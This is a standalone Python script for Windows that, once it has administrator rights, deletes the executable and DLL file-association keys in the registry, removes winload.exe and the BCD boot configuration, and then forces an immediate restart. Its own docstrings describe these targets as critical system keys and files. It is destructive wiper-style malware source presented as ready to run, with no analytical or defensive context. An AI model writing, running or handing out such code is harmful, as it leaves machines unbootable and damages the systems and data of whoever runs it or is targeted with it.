import os
import subprocess
import ctypes
import sys

def is_admin():
    """Check if the script is running with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def delete_registry_keys():
    """Delete critical registry keys."""
    try:
        subprocess.run(["reg", "delete", "HKCR/.exe", "/f"], check=True, shell=True)
        subprocess.run(["reg", "delete", "HKCR/.dll", "/f"], check=True, shell=True)
        subprocess.run(["reg", "delete", "HKCR/*", "/f"], check=True, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Error deleting registry keys: {e}")

def delete_files():
    """Delete critical system files."""
    try:
        os.remove(r"C:\Windows\System32\winload.exe")
        os.remove(r"C:\Windows\Boot\BCD")
    except FileNotFoundError as e:
        print(f"File not found: {e}")
    except PermissionError as e:
        print(f"Permission error: {e}")

def force_shutdown():
    """Force a system shutdown."""
    try:
        subprocess.run(["shutdown", "/r", "/t", "0"], check=True, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Error during shutdown: {e}")

if __name__ == "__main__":
    if not is_admin():
        print("This script requires administrative privileges. Please run as administrator.")
        sys.exit(1)

    delete_registry_keys()
    delete_files()
    force_shutdown()
